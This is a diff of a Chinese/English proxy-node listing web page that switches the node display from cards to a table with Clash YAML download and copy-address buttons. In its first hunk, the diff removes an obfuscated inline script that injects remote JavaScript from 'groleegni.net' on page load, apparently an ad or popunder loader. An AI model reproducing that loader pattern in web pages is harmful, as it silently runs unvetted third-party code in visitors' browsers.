@@ -21,7 +21,7 @@
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9449283,document.createElement('script'))</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-yaml/4.1.0/js-yaml.min.js"></script>
     <style>
         :root {
             --primary: #6366f1;
@@ -477,6 +477,50 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        /* 服务器表格 */
+        .server-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            background: rgba(30, 41, 59, 0.6);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .server-table th {
+            background: var(--primary);
+            color: white;
+            padding: 12px 15px;
+            text-align: left;
+        }
+        
+        .server-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .server-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .server-table tr:hover {
+            background: rgba(99, 102, 241, 0.1);
+        }
+        
+        .download-link {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .download-link:hover {
+            background: var(--primary-dark);
+        }
     </style>
 </head>
 <body>
@@ -582,9 +626,10 @@
                 <button class="filter-btn" data-sort="newest" data-i18n="filters.newest">最新添加</button>
             </div>
             
-            <div class="nodes-grid" id="nodes-container">
+            <div id="server-list">
                 <div class="loader">
                     <div class="spinner"></div>
+                    <p data-i18n="nodes.loading">正在加载节点数据...</p>
                 </div>
             </div>
         </div>
@@ -599,11 +644,11 @@
                 <h2 data-i18n="auth.login_title">登录账户</h2>
                 <div class="form-group">
                     <label for="login-email" data-i18n="auth.email">邮箱地址</label>
-                    <input type="email" id="login-email" :placeholder="translations[currentLang].auth.email_placeholder">
+                    <input type="email" id="login-email" placeholder="输入您的邮箱">
                 </div>
                 <div class="form-group">
                     <label for="login-password" data-i18n="auth.password">密码</label>
-                    <input type="password" id="login-password" :placeholder="translations[currentLang].auth.password_placeholder">
+                    <input type="password" id="login-password" placeholder="输入密码">
                 </div>
                 <button class="btn" onclick="login()" data-i18n="auth.login">登录</button>
                 <div class="google-login">
@@ -620,15 +665,15 @@
                 <h2 data-i18n="auth.register_title">创建账户</h2>
                 <div class="form-group">
                     <label for="register-email" data-i18n="auth.email">邮箱地址</label>
-                    <input type="email" id="register-email" :placeholder="translations[currentLang].auth.email_placeholder">
+                    <input type="email" id="register-email" placeholder="输入您的邮箱">
                 </div>
                 <div class="form-group">
                     <label for="register-password" data-i18n="auth.password">密码</label>
-                    <input type="password" id="register-password" :placeholder="translations[currentLang].auth.create_password">
+                    <input type="password" id="register-password" placeholder="创建密码（至少8位）">
                 </div>
                 <div class="form-group">
                     <label for="register-confirm" data-i18n="auth.confirm_password">确认密码</label>
-                    <input type="password" id="register-confirm" :placeholder="translations[currentLang].auth.confirm_password_placeholder">
+                    <input type="password" id="register-confirm" placeholder="再次输入密码">
                 </div>
                 <button class="btn" onclick="register()" data-i18n="auth.register">注册</button>
                 <div class="google-login">
@@ -875,6 +920,37 @@
                 "filters.shadowsocks": "Shadowsocks",
                 "filters.fastest": "Fastest",
                 "filters.newest": "Newest",
+                "nodes.name": "Name",
+                "nodes.type": "Type",
+                "nodes.status": "Status",
+                "nodes.operation": "Operation",
+                "nodes.loading": "Loading node data...",
+                "nodes.latency": "Latency",
+                "nodes.inactive": "Inactive",
+                "nodes.unnamed": "Unnamed Node",
+                "nodes.unknown_server": "Unknown Server",
+                "nodes.unknown_port": "Unknown Port",
+                "nodes.unknown_protocol": "Unknown Protocol",
+                "nodes.copy_config": "Copy Config",
+                "nodes.download": "Download",
+                "nodes.copy_address": "Copy Address",
+                "nodes.copied": "Copied!",
+                "nodes.copy_failed": "Copy Failed",
+                "nodes.download_failed": "Download Failed",
+                "nodes.no_action": "No Action",
+                "nodes.load_failed": "Failed to load node data",
+                "nodes.load_failed_title": "Node Loading Failed",
+                "nodes.load_failed_message": "Please refresh or try again later",
+                "nodes.refresh": "Refresh Page",
+                "nodes.no_nodes_title": "No Nodes Available",
+                "nodes.no_nodes_message": "Please try again later or contact admin",
+                "protocol.vmess": "VMess",
+                "protocol.vless": "VLESS",
+                "protocol.ss": "Shadowsocks",
+                "protocol.trojan": "Trojan",
+                "protocol.ssr": "ShadowsocksR",
+                "protocol.hysteria": "Hysteria",
+                "protocol.unknown": "Unknown Protocol",
                 
                 // 页脚
                 "footer.about": "About Us",
@@ -1088,6 +1164,37 @@
                 "filters.shadowsocks": "Shadowsocks",
                 "filters.fastest": "最快节点",
                 "filters.newest": "最新添加",
+                "nodes.name": "名称",
+                "nodes.type": "类型",
+                "nodes.status": "状态",
+                "nodes.operation": "操作",
+                "nodes.loading": "正在加载节点数据...",
+                "nodes.latency": "延迟",
+                "nodes.inactive": "已失效",
+                "nodes.unnamed": "未命名节点",
+                "nodes.unknown_server": "未知服务器",
+                "nodes.unknown_port": "未知端口",
+                "nodes.unknown_protocol": "未知协议",
+                "nodes.copy_config": "复制配置",
+                "nodes.download": "下载",
+                "nodes.copy_address": "复制地址",
+                "nodes.copied": "已复制!",
+                "nodes.copy_failed": "复制失败",
+                "nodes.download_failed": "下载失败",
+                "nodes.no_action": "无操作",
+                "nodes.load_failed": "加载节点数据失败",
+                "nodes.load_failed_title": "节点加载失败",
+                "nodes.load_failed_message": "请刷新页面重试或稍后再访问",
+                "nodes.refresh": "刷新页面",
+                "nodes.no_nodes_title": "暂无可用节点",
+                "nodes.no_nodes_message": "请稍后再尝试或联系管理员",
+                "protocol.vmess": "VMess",
+                "protocol.vless": "VLESS",
+                "protocol.ss": "Shadowsocks",
+                "protocol.trojan": "Trojan",
+                "protocol.ssr": "ShadowsocksR",
+                "protocol.hysteria": "Hysteria",
+                "protocol.unknown": "未知协议",
                 
                 // 页脚
                 "footer.about": "关于我们",
@@ -1155,6 +1262,7 @@
         // DOM元素
         const nodesContainer = document.getElementById('nodes-container');
         const filterButtons = document.querySelectorAll('.filter-btn');
+        const serverList = document.getElementById('server-list');
         
         // 模态框相关
         const authModal = document.getElementById('auth-modal');
@@ -1263,26 +1371,34 @@
             `;
         }
         
+        // 获取协议类型名称
+        function getProtocolType(type) {
+            const key = `protocol.${type}`;
+            return translations[currentLang][key] || type;
+        }
+        
         // 加载节点数据
         async function loadNodes() {
             try {
                 // 显示加载状态
-                nodesContainer.innerHTML = `
-                    <div class="loader">
-                        <div class="spinner"></div>
-                        <span>${translations[currentLang]['nodes.loading'] || '正在加载节点数据...'}</span>
-                    </div>
-                `;
+                const loading = serverList.querySelector('.loader');
+                if (loading) {
+                    loading.querySelector('p').textContent = translations[currentLang]['nodes.loading'] || '正在加载节点数据...';
+                }
                 
-                const response = await fetch('nodes.json');
-                if (!response.ok) throw new Error(translations[currentLang]['nodes.load_failed'] || '网络响应异常');
+                const timestamp = new Date().getTime();
+                const res = await fetch(`/nodes.json?t=${timestamp}`, { cache: 'no-store' });
                 
-                nodes = await response.json();
+                if (!res.ok) {
+                    throw new Error(translations[currentLang]['nodes.load_failed'] || '网络响应异常');
+                }
+                
+                nodes = await res.json();
                 renderNodes(nodes);
                 selectBestNode();
             } catch (error) {
                 console.error('加载节点失败:', error);
-                nodesContainer.innerHTML = `
+                serverList.innerHTML = `
                     <div class="error-message" style="grid-column: 1/-1; text-align: center; padding: 40px;">
                         <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: var(--warning); margin-bottom: 20px;"></i>
                         <h3>${translations[currentLang]['nodes.load_failed_title'] || '节点加载失败'}</h3>
@@ -1297,10 +1413,8 @@
         
         // 渲染节点
         function renderNodes(nodesToRender) {
-            nodesContainer.innerHTML = '';
-            
             if (!nodesToRender || nodesToRender.length === 0) {
-                nodesContainer.innerHTML = `
+                serverList.innerHTML = `
                     <div style="grid-column: 1/-1; text-align: center; padding: 40px;">
                         <i class="fas fa-frown" style="font-size: 3rem; color: var(--gray); margin-bottom: 20px;"></i>
                         <h3>${translations[currentLang]['nodes.no_nodes_title'] || '暂无可用节点'}</h3>
@@ -1310,44 +1424,116 @@
                 return;
             }
             
+            // 创建表格
+            const table = document.createElement('table');
+            table.className = 'server-table';
+            
+            // 创建表头
+            const thead = document.createElement('thead');
+            thead.innerHTML = `
+                <tr>
+                    <th>${translations[currentLang]['nodes.name'] || '名称'}</th>
+                    <th>${translations[currentLang]['nodes.type'] || '类型'}</th>
+                    <th>${translations[currentLang]['nodes.status'] || '状态'}</th>
+                    <th>${translations[currentLang]['nodes.operation'] || '操作'}</th>
+                </tr>
+            `;
+            table.appendChild(thead);
+            
+            // 创建表格主体
+            const tbody = document.createElement('tbody');
+            
             nodesToRender.forEach(node => {
-                const nodeCard = document.createElement('div');
-                nodeCard.className = 'node-card';
-                nodeCard.dataset.protocol = node.type;
+                const row = document.createElement('tr');
                 
-                // 状态指示器
+                // 名称列
+                const nameCell = document.createElement('td');
+                nameCell.textContent = node.name || translations[currentLang]['nodes.unnamed'] || '未命名节点';
+                row.appendChild(nameCell);
+                
+                // 类型列
+                const typeCell = document.createElement('td');
+                const protocolType = getProtocolType(node.type || '');
+                typeCell.textContent = protocolType;
+                row.appendChild(typeCell);
+                
+                // 状态列
+                const statusCell = document.createElement('td');
                 const isActive = node.latency && node.latency < 500;
-                
-                nodeCard.innerHTML = `
-                    <div class="node-status">
-                        <span class="status-indicator ${isActive ? 'active' : 'inactive'}"></span>
-                        <span class="status-text">${isActive ? 
-                            (translations[currentLang]['nodes.latency'] || '延迟') + `: ${node.latency}ms` : 
-                            (translations[currentLang]['nodes.inactive'] || '已失效')}</span>
-                    </div>
-                    
-                    <h3 class="node-name">${node.name || (translations[currentLang]['nodes.unnamed'] || '未命名节点')}</h3>
-                    <div class="node-meta">
-                        <span><i class="fas fa-server"></i> ${node.server || (translations[currentLang]['nodes.unknown_server'] || '未知服务器')}:${node.port || (translations[currentLang]['nodes.unknown_port'] || '未知端口')}</span>
-                        <span><i class="fas fa-plug"></i> ${node.type ? node.type.toUpperCase() : (translations[currentLang]['nodes.unknown_protocol'] || '未知协议')}</span>
-                    </div>
-                    
-                    <div class="node-actions">
-                        <button class="btn btn-copy" data-config="${btoa(encodeURIComponent(node.config || ''))}">
-                            <i class="fas fa-copy"></i> ${translations[currentLang]['nodes.copy_config'] || '复制配置'}
-                        </button>
-                        <button class="btn btn-download" data-config="${btoa(encodeURIComponent(node.config || ''))}" 
-                                data-filename="${node.name || 'node'}.${node.type === 'vmess' ? 'vmess' : 'ss'}">
-                            <i class="fas fa-download"></i> ${translations[currentLang]['nodes.download'] || '下载'}
-                        </button>
-                    </div>
+                statusCell.innerHTML = `
+                    <span class="status-indicator ${isActive ? 'active' : 'inactive'}"></span>
+                    <span class="status-text">${isActive ? 
+                        (translations[currentLang]['nodes.latency'] || '延迟') + `: ${node.latency}ms` : 
+                        (translations[currentLang]['nodes.inactive'] || '已失效')}</span>
                 `;
+                row.appendChild(statusCell);
                 
-                nodesContainer.appendChild(nodeCard);
+                // 操作列
+                const actionCell = document.createElement('td');
+                
+                // 根据节点类型创建不同的操作
+                if (node.clash_config) {
+                    // 配置下载按钮
+                    const downloadBtn = document.createElement('button');
+                    downloadBtn.className = 'download-link';
+                    downloadBtn.textContent = translations[currentLang]['nodes.download'] || '下载配置';
+                    downloadBtn.onclick = () => {
+                        try {
+                            // 生成YAML配置
+                            const yamlConfig = jsyaml.dump([node.clash_config]);
+                            
+                            // 创建有意义的文件名
+                            let fileName = node.name.replace(/[^a-z0-9]/gi, '_') || 'vpn_config';
+                            fileName = fileName.substring(0, 30); // 限制文件名长度
+                            
+                            // 添加扩展名
+                            fileName += '.yaml';
+                            
+                            const blob = new Blob([yamlConfig], { type: 'text/yaml' });
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = fileName;
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            URL.revokeObjectURL(url);
+                        } catch (e) {
+                            console.error('下载失败:', e);
+                            alert(`${translations[currentLang]['nodes.download_failed'] || '下载失败'}: ${e.message}`);
+                        }
+                    };
+                    actionCell.appendChild(downloadBtn);
+                } else if (node.server && node.port) {
+                    // 服务器地址按钮
+                    const copyBtn = document.createElement('button');
+                    copyBtn.className = 'download-link';
+                    copyBtn.textContent = translations[currentLang]['nodes.copy_address'] || '复制地址';
+                    copyBtn.onclick = () => {
+                        navigator.clipboard.writeText(`${node.server}:${node.port}`)
+                          .then(() => {
+                              copyBtn.textContent = translations[currentLang]['nodes.copied'] || '已复制!';
+                              setTimeout(() => {
+                                  copyBtn.textContent = translations[currentLang]['nodes.copy_address'] || '复制地址';
+                              }, 2000);
+                          })
+                          .catch(err => {
+                              console.error('复制失败:', err);
+                              copyBtn.textContent = translations[currentLang]['nodes.copy_failed'] || '复制失败';
+                          });
+                    };
+                    actionCell.appendChild(copyBtn);
+                } else {
+                    actionCell.textContent = translations[currentLang]['nodes.no_action'] || '无操作';
+                }
+                
+                row.appendChild(actionCell);
+                tbody.appendChild(row);
             });
             
-            // 添加事件监听器
-            addEventListeners();
+            table.appendChild(tbody);
+            serverList.innerHTML = '';
+            serverList.appendChild(table);
         }
         
         // 自动选择最佳节点
@@ -1360,59 +1546,14 @@
                 validNodes.sort((a, b) => a.latency - b.latency);
                 const bestNode = validNodes[0];
                 
-                const nodeCards = document.querySelectorAll('.node-card');
-                nodeCards.forEach(card => {
-                    const nodeName = card.querySelector('.node-name').textContent;
+                const rows = serverList.querySelectorAll('tr');
+                rows.forEach(row => {
+                    const nodeName = row.querySelector('td:first-child').textContent;
                     if (nodeName === bestNode.name) {
-                        card.classList.add('recommended');
+                        row.classList.add('recommended');
                     }
                 });
             }
-        }
-        
-        // 添加事件监听器
-        function addEventListeners() {
-            // 复制配置
-            document.querySelectorAll('.btn-copy').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const config = decodeURIComponent(atob(this.dataset.config));
-                    
-                    navigator.clipboard.writeText(config).then(() => {
-                        const originalText = this.innerHTML;
-                        this.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang]['nodes.copied'] || '已复制'}`;
-                        
-                        setTimeout(() => {
-                            this.innerHTML = originalText;
-                        }, 2000);
-                    }).catch(err => {
-                        console.error('复制失败:', err);
-                        alert(translations[currentLang]['nodes.copy_failed'] || '复制失败，请手动复制配置');
-                    });
-                });
-            });
-            
-            // 下载配置
-            document.querySelectorAll('.btn-download').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const config = decodeURIComponent(atob(this.dataset.config));
-                    const fileName = this.dataset.filename;
-                    
-                    const blob = new Blob([config], { type: 'text/plain' });
-                    const url = URL.createObjectURL(blob);
-                    
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = fileName;
-                    document.body.appendChild(a);
-                    a.click();
-                    
-                    // 清理
-                    setTimeout(() => {
-                        document.body.removeChild(a);
-                        URL.revokeObjectURL(url);
-                    }, 100);
-                });
-            });
         }
         
         // 初始化页面
